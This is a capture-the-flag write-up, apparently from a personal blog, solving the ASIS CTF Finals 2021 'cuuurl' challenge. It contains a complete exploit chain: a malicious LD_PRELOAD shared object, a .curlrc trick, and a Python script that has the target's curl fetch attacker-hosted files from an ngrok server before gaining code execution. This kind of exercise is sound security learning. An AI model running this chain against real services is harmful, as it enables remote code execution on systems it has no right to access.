---
title: ASIS CTF Finals 2021 - cuuurl
date: 2022-01-07
slug: /writeups/asisfinals-2021-cuuurl/
excerpt: Arbitrary curl to RCE
author: Darin Mao
---

cuuurl was an easy web/misc challenge from ASIS CTF Finals 2021.

# Description
> Do you know how to pronounce "curl"?

Files:
- [cuuurl_e2eb98995db9a016f97d6b66513baa1070d24418.txz](https://asisctf.com/tasks/cuuurl_e2eb98995db9a016f97d6b66513baa1070d24418.txz)

# Inspection
There are three endpoints.

```python
@app.route('/')
def index(): #Poor coding skills :( can't even get process output properly
	url = request.args.get('url') or "http://localhost:8000/sayhi"
	env = request.args.get('env') or None
	outputFilename = request.args.get('file') or "myregrets.txt"
	outputFolder = f"./outputs/{hashlib.md5(request.remote_addr.encode()).hexdigest()}"
	result = ""

	if(env):
		env = env.split("=")
		env = {env[0]:env[1]}
	else:
		env = {}

	master, slave = pty.openpty()
	os.set_blocking(master,False)
	try:
		subprocess.run(["/usr/bin/curl","--url",url],stdin=slave,stdout=slave,env=env,timeout=3,)
		result = os.read(master,0x4000)
	except:
		os.close(slave)
		os.close(master)
		return '??',200,{'content-type':'text/plain;charset=utf-8'}

	os.close(slave)
	os.close(master)

	if(not os.path.exists(outputFolder)):
		os.mkdir(outputFolder)

	if("/" in outputFilename):
		outputFilename = secrets.token_urlsafe(0x10)

	with open(f"{outputFolder}/{outputFilename}","wb") as f:
		f.write(result)

	return redirect(f"/view?file={outputFilename}", code=302)
```
We are allowed to run `curl` with any `--url`, along with a single environment variable of our choice. Interestingly, the output is sent to a PTY instead of being read directly, and then it is written to a file with a name we also control in a known location.

```python
@app.route('/view')
def view():
	outputFolder = f"./outputs/{hashlib.md5(request.remote_addr.encode()).hexdigest()}"
	outputFilename = request.args.get('file')

	if(not outputFilename or "/" in outputFilename or not os.path.exists(f'{outputFolder}/{outputFilename}')):
		return '???',404,{'content-type':'text/plain;charset=utf-8'}

	with open(f'{outputFolder}/{outputFilename}','rb') as f:
		return f.read(),200,{'content-type':'text/plain;charset=utf-8'}
```
This endpoint just reads a file in our own directory. We tried for a bit, but there doesn't seem to be any way to read anything outside our directory due to the `"/" in outputFilename` check.

```python
@app.route('/sayhi')
def sayhi():
	return 'hi hacker ヾ(＾-＾)ノ',200,{'content-type':'text/plain;charset=utf-8'}
```
This does nothing useful.

The flag is only accessible through SUID binary `/readflag`, so the goal will be to gain code execution.

# Code Execution through `LD_PRELOAD`
Since we can control one environment variable, we can use `LD_PRELOAD` to load a library that we download. From the [`ld.so` man page](https://man7.org/linux/man-pages/man8/ld.so.8.html):

> `LD_PRELOAD`: A list of additional, user-specified, ELF shared objects to be loaded before all others.

So let's make a quick shared object that just executes `/readflag`.

```c
#include <stdlib.h>

void __attribute__((constructor)) sice() {
  unsetenv("LD_PRELOAD"); // so /readflag doesn't try to load this again
  system("/readflag");
  exit(0);
}
```

For testing purposes, I've placed a binary that prints `ginkoid` at `/readflag`.

```
$ gcc -o libpepega.so -fPIC -shared pepega.c
$ LD_PRELOAD=./libpepega.so curl https://example.org
ginkoid
```

Success! Now we just need to download this shared object.

# Downloading Shared Object
Now, it's clear that the author intentionally used the entirely unnecessary PTY just to add an extra challenge. Everyone who's ever tried to `curl` a binary file from the terminal directly knows that it doesn't work.

```
$ curl http://mirrors.mit.edu/archlinux/iso/2022.01.01/archlinux-2022.01.01-x86_64.iso
Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: <FILE>" to save to a file.
```

Unfortunately, we don't have the luxury of setting `--output`. Could we use our one environment variable to set some more options? Of course! From the [`curl` man page](https://curl.se/docs/manpage.html):

> `-K, --config <file>`: Specify a text file to read curl arguments from. The command line arguments found in the text file will be used as if they were provided on the command line.
>
> ...
>
> The default config file is checked for in the following places in this order:
> 1. `"$CURL_HOME/.curlrc"`

So all we need to do is download our own `.curlrc` file, then set `CURL_HOME` to our own directory. That lets us set any options, including the necessary `-o libpepega.so` option.

# Solution Code
We'll need a web server to download these files from. My weapon of choice is `python3 -m http.server <port>` along with `ngrok http <port>`.

We don't know what our directory is yet (our script will figure that out), so we'll create a template `.curlrc` without the MD5 hash of our IP.

```
-o /app/outputs/PEPEGA/libpepega.so
```

First, we'll get our own IP and hash it to get our folder name.

```python
import requests
import hashlib

server = '<your ngrok URL>'
chall = 'http://65.108.152.108:5001'
ip = requests.get('https://ifconfig.me').text
folder = hashlib.md5(ip.encode()).hexdigest()
```

Then, we can make and download the `.curlrc` file.

```python
curlrc = open('curlrc').read().replace('PEPEGA', folder)
with open('curlrc2', 'w') as f:
  f.write(curlrc)

requests.get(chall, params={
  'url': f'{server}/curlrc2',
  'file': '.curlrc',
})
```

Now, we can just download the shared object and execute it to get the flag.

```python
requests.get(chall, params={
  'url': f'{server}/libpepega.so',
  'env': f'CURL_HOME=/app/outputs/{folder}'
})

print(requests.get(chall, params={
  'url': 'pepega',
  'env': f'LD_PRELOAD=/app/outputs/{folder}/libpepega.so',
}).text)
```

This gives the flag.

```
$ python3 solve.py
ASIS{is-this-a-web-chall-or-misc...hmmmmmm...idk}
```

Definitely misc.

# Appendix: Shared Object File Permissions
Everyone who worked on this challenge was under the impression that a shared object had to be executable to be `LD_PRELOAD`ed. This would be a problem because we have no way to set that permission. We wasted a lot of time before thinking to just try it—turns out it's not necessary at all!

```
$ chmod -x libpepega.so
$ ls -l libpepega.so
-rw-r--r-- 1 darin darin 16304 Jan  7 22:35 libpepega.so
$ LD_PRELOAD=./libpepega.so curl https://example.org
ginkoid
```

This makes sense, actually. We only need read permission to `open` and `mmap` it.

```
openat(AT_FDCWD, "./libpepega.so", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\240\20\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=16304, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f48c4aac000
getcwd("/home/darin/ctfs/asis-2021/cuuurl", 128) = 34
mmap(NULL, 16448, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f48c4aa7000
mmap(0x7f48c4aa8000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1000) = 0x7f48c4aa8000
mmap(0x7f48c4aa9000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f48c4aa9000
mmap(0x7f48c4aaa000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f48c4aaa000
close(3)                                = 0
```
